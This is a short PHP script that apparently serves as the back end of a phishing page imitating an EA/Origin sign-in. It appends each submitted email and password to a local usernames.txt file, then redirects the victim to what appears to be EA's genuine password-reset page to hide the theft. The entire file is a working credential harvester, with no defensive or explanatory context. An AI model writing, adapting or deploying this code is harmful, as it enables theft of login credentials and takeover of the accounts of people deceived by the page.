<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1');
exit();
